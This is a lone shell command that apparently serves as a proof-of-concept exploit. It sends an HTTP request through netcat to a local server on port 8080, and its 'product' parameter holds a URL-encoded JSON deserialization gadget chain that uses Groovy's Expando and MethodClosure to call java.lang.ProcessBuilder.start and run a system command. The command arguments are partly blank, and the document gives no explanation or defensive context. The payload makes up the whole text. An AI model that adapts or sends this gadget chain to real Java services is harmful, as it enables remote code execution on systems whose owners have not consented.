nc localhost 8080 <<EOF
GET /?product=%7b%22@type%22%3a%22java.util.Arrays$ArrayList%22%2c%22@items%22%3a[%7b%22@id%22%3a2%2c%22@type%22%3a%22groovy.util.Expando%22%2c%22expandoProperties%22%3a%7b%22@type%22%3a%22java.util.HashMap%22%2c%22hashCode%22%3a%7b%22@type%22%3a%22org.codehaus.groovy.runtime.MethodClosure%22%2c%22method%22%3a%22start%22%2c%22delegate%22%3a%7b%22@id%22%3a1%2c%22@type%22%3a%22java.lang.ProcessBuilder%22%2c%22command%22%3a%7b%22@type%22%3a%22java.util.ArrayList%22%2c%22@items%22%3a[%22%22%2c%20%22%20%2fc%22%2c%20]%7d%2c%22directory%22%3anull%2c%22environment%22%3anull%2c%22redirectErrorStream%22%3afalse%2c%22redirects%22%3anull%7d%2c%22owner%22%3a%7b%22@ref%22%3a1%7d%2c%22thisObject%22%3anull%2c%22resolveStrategy%22%3a0%2c%22directive%22%3a0%2c%22parameterTypes%22%3a[]%2c%22maximumNumberOfParameters%22%3a0%2c%22bcw%22%3anull%7d%7d%7d%2c%7b%22@type%22%3a%22java.util.HashMap%22%2c%22@keys%22%3a[%7b%22@ref%22%3a2%7d%2c%7b%22@ref%22%3a2%7d]%2c%22@items%22%3a[%7b%22@ref%22%3a2%7d%2c%7b%22@ref%22%3a2%7d]%7d]%7d&apiKey=00000000000000000000000000000000&map=light&format=jpg&language=en&geocode=38.5,-77.5&h=600&w=800&lod=7 HTTP/1.1
Host: localhost

EOF

